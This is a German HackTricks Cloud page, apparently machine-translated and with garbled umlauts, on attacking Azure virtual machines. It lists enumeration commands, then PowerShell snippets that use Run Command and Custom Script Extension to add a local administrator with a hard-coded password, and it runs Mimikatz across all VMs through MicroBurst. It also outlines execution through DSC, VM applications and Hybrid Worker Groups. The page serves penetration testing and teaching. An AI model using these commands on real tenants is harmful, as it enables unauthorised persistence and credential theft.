# Az - Virtuelle Maschinen & Netzwerk

{% hint style="success" %}
Lernen & √ºben Sie AWS-Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP-Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.

</details>
{% endhint %}

## Grundlegende Informationen

[Aus den Dokumenten:](https://learn.microsoft.com/en-us/azure/virtual-machines/overview) Azure Virtual Machines sind eine von mehreren Arten von [auf Abruf skalierbaren Rechenressourcen](https://learn.microsoft.com/en-us/azure/architecture/guide/technology-choices/compute-decision-tree), die Azure anbietet. In der Regel w√§hlen Sie eine virtuelle Maschine, wenn Sie mehr Kontrolle √ºber die Rechenumgebung ben√∂tigen als die anderen Optionen bieten. Dieser Artikel gibt Ihnen Informationen dar√ºber, was Sie beachten sollten, bevor Sie eine virtuelle Maschine erstellen, wie Sie sie erstellen und wie Sie sie verwalten.

## Azure Netzwerkinformationen

Azure-Netzwerke enthalten **verschiedene Entit√§ten und M√∂glichkeiten zu deren Konfiguration.** Sie finden eine kurze **Beschreibung,** **Beispiele** und **Auflistungsbefehle** der verschiedenen Azure-Netzwerkentit√§ten in:

{% content-ref url="az-azure-network.md" %}
[az-azure-network.md](az-azure-network.md)
{% endcontent-ref %}

## Azure Bastion

**Azure Bastion** bietet eine sichere, vollst√§ndig verwaltete RDP (Remote Desktop Protocol) und SSH (Secure Shell) Zugriffsl√∂sung √ºber SSL √ºber das Azure-Portal. Es ist in ein Azure Virtual Network integriert, erm√∂glicht RDP- und SSH-Konnektivit√§t zu VMs unter Verwendung privater IPs und vermeidet die Notwendigkeit √∂ffentlicher IPs. Dies macht es zu einer sichereren, bequemeren Alternative zu traditionellen Methoden, die √∂ffentliche IP-Zuweisungen und NSG-Regelkonfigurationen f√ºr den VM-Zugriff erfordern. Entwickler und IT-Personal k√∂nnen sicher auf VMs aus dem Azure-Portal mit ihren Webbrowsern zugreifen und den Prozess f√ºr Entwicklungs- und Testumgebungen optimieren.

Um alle Azure Bastion-Hosts in Ihrem Abonnement aufzulisten, k√∂nnen Sie den folgenden Befehl verwenden:

{% code overflow="wrap" %}
```bash
az network bastion list --query "[].{name:name, resourceGroup:resourceGrou, location:location}" -o table
```
{% endcode %}

## VM-Auflistung
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```
## **Befehle in einer VM ausf√ºhren**

### **AAD-Anmeldung in VM**

Es ist m√∂glich, den Zugriff f√ºr Benutzer zu erlauben, die √ºber AzureAD authentifiziert sind. Wenn Sie beispielsweise versuchen, auf eine **Linux-VM** zuzugreifen: `ssh benutzername@azure-corp.com@1.1.1.1` (es ist wichtig, **die E-Mail-Adresse** mit dem AzureAD zu verwenden, das beim Anmeldeversuch verwendet wurde), k√∂nnten Sie einen Fehler erhalten wie:
```
(username@azure-corp.com@1.1.1.1) This preview capability is not for production use. When you sign in, verify the name of the app on the sign-in screen is "Azure Linux VM Sign-in" and the IP address of the target VM is correct.

To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code DT4PNSTGR to authenticate. Press ENTER when ready.
```
{% endcode %}

Einfach **befolgen Sie diese Anweisungen**, gehen Sie zu [https://microsoft.com/devicelogin](https://microsoft.com/devicelogin) und geben Sie den Code ein, verwenden Sie die E-Mail und das Passwort als Anmeldeinformationen und Sie k√∂nnen eine Verbindung √ºber SSH herstellen (sofern dieser Benutzer √ºber ausreichende Berechtigungen verf√ºgt: Rolle `Virtual Machine Administrator Login` oder `Virtual Machine User Login`).

### **Befehl ausf√ºhren**
```powershell
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' ‚ÄìVerbose
## Another way
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' ‚ÄìVerbose

# Content of the script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
### **Ausf√ºhren der benutzerdefinierten Skript-Erweiterung**

Azure Virtual Machine (VM)-Erweiterungen sind **kleine Anwendungen**, die nach der Bereitstellung Konfigurations- und Automatisierungsaufgaben auf **Azure VMs** bereitstellen. Wenn beispielsweise eine virtuelle Maschine eine Softwareinstallation, Virenschutz oder die M√∂glichkeit zum Ausf√ºhren eines Skripts darin erfordert, k√∂nnen Sie eine VM-Erweiterung verwenden.

Daher k√∂nnen Sie bei Zugriff auf das Schreiben beliebigen Code ausf√ºhren:
```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```
### Gew√ºnschter Konfigurationszustand (DSC)

Der gew√ºnschte Konfigurationszustand (DSC) ist ein PowerShell-Tool √§hnlich wie Ansible, das zur Einrichtung eines Hosts durch Code verwendet wird. DSC integriert sich mit Azure und erm√∂glicht das Hochladen spezifischer Konfigurationsdateien. Diese Dateien m√ºssen einer strengen Syntax entsprechen. Bemerkenswert ist, dass die DSC-Erweiterung in Azure Befehle aus Dateien ausf√ºhren kann, die bestimmte Formatierungskriterien erf√ºllen, auch wenn die Syntax nicht den DSC-Standards entspricht, wie in der bereitgestellten Abbildung gezeigt.

Die Ausf√ºhrung dieser Befehle wird durch die Funktion [**`Publish-AzVMDscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration?view=azps-7.5.0) in Az PowerShell erleichtert. Die Anforderungen umfassen eine **.PS1**-Datei mit einer definierten Funktion, die in eine **.zip**-Datei gepackt werden muss. Auch wenn die Syntax f√ºr DSC m√∂glicherweise nicht korrekt ist, wird der Code dennoch ausgef√ºhrt. Die Erweiterung markiert jedoch den Ausf√ºhrungsstatus als "Fehler", und es wird keine Ausgabe des Befehls angezeigt, da der Status durch die Fehlermeldung √ºberschrieben wird.

### VM-Anwendungsdefinitionen

VM-Anwendungsdefinitionen erm√∂glichen die wiederholbare Bereitstellung versionierter Anwendungen auf einer Azure-VM. Diese Ressource unterst√ºtzt die Bereitstellung und Aktualisierung von Anwendungen auf VMs. Zur Einrichtung sind mehrere Schritte erforderlich, die Befehle wie **`New-AzGalleryApplication`** und **`New-AzGalleryApplicationVersion`** in Az PowerShell beinhalten.

Die Ausf√ºhrung von Anwendungen oder Befehlen √ºber diese Methode erfolgt √ºber die **"VMAppExtension"**, die automatisch installiert wird, wenn eine Anwendung auf eine VM angewendet wird. Die Erweiterung ruft die Datei von der angegebenen URI ab und benennt sie genau wie die Anwendung ohne Erweiterung. Um die Datei korrekt auszuf√ºhren, muss das Feld "ManageActions" im REST-API-Aufruf konfiguriert werden, um die Datei mit der entsprechenden Erweiterung umzubenennen. Die Einrichtung dieser Methode wird nach Abschluss der Arbeiten der Struktur in der bereitgestellten Abbildung √§hneln.

Diese Ausf√ºhrungsmethode ist jedoch relativ langsam und ben√∂tigt etwa 3-4 Minuten, um eine Anwendung oder einen Befehl auszuf√ºhren. Die Dateien im Zusammenhang mit diesem Prozess werden in spezifischen Verzeichnissen gespeichert (`C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Downloads\` f√ºr die Anwendungskopie und `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Status\` f√ºr den Ausf√ºhrungsstatus).

Beide Techniken bieten einzigartige M√∂glichkeiten zur Ausf√ºhrung von Befehlen und Bereitstellung von Anwendungen in Azure-Umgebungen, jeweils mit eigenen Anforderungen, Schritten und √úberlegungen.

### Hybrid Worker Groups (HWGs) in Azure

[**Hybrid Worker Groups (HWGs)**](https://docs.microsoft.com/en-us/azure/automation/automation-hybrid-runbook-worker) sind eine Funktion in Azure, die es erm√∂glicht, Runbooks, die in einem Automatisierungskonto konfiguriert sind, auf einer Azure Virtual Machine (VM) auszuf√ºhren, die Teil der festgelegten HWG ist. Diese Ausf√ºhrung wird durch eine Erweiterung auf der VM erleichtert, die den Runbook-Code auf die VM bereitstellt. Ein wesentlicher Aspekt dieses Prozesses ist, dass die tats√§chlichen Anmeldeinformationen bei der Ausf√ºhrung keine Rolle spielen, da der Code mit erh√∂hten Berechtigungen, speziell als **SYSTEM** oder root, ausgef√ºhrt wird, wie in der bereitgestellten Abbildung dargestellt.

Ein wichtiger Punkt f√ºr diejenigen, die Windows 10-VMs nutzen, ist die Notwendigkeit, die PowerShell-Version f√ºr das Runbook anzugeben. Es sollte auf die Ausf√ºhrung als PowerShell-Version 5.1 anstelle von 7.1 eingestellt werden. Diese Anforderung ergibt sich daraus, dass PowerShell 7.1 standardm√§√üig nicht auf diesen VMs installiert ist, was zu einem Fehler in der Skriptausf√ºhrung f√ºhrt, wenn Version 7.1 angegeben ist.

Diese Funktion von Azure bietet eine robuste Methode zur Automatisierung und Verwaltung von Aufgaben in hybriden Umgebungen und erm√∂glicht eine zentrale Verwaltung und Ausf√ºhrung von Aufgaben auf Azure-VMs.


## Referenzen

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)

{% hint style="success" %}
Lernen Sie und √ºben Sie AWS-Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Lernen Sie und √ºben Sie GCP-Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
{% endhint %}
